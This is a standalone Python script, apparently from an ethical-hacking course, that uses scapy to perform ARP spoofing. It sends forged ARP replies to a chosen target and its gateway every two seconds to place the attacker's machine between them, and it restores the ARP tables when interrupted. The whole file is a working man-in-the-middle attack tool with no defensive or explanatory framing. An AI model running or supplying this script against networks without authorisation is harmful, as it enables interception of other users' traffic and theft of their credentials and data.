#!/usr/bin/env python

import scapy.all as scapy
import argparse
import time


def get_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("-t", "--target", dest="target_ip", help="IP address of target machine")
    parser.add_argument("-g", "--gateway", dest="gateway_ip", help="IP address of gateway")
    options = parser.parse_args()
    if not options.target_ip:
        parser.error("[-] Specify target machine's ip, use --help for more info!")
    elif not options.gateway_ip:
        parser.error('[-] Specify gateway ip, use --help for more info!')
    return options


def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    return answered_list[0][1].hwsrc


def spoof_ip(target_ip, gateway_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip)
    scapy.send(packet, count=4, verbose=False)


def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, count=4, verbose=False)


options = get_arguments()

sent_packets_count = 0
try:
    while True:
        spoof_ip(options.target_ip, options.gateway_ip)
        spoof_ip(options.gateway_ip, options.target_ip)
        sent_packets_count = sent_packets_count + 2
        print("\r [+] Sent packets: " + str(sent_packets_count), end="")
        time.sleep(2)
except KeyboardInterrupt:
    print("\n[+] Detected CTR+C.......Resetting ARP, please wait!")
    restore(options.target_ip, options.gateway_ip)
    restore(options.gateway_ip, options.target_ip)
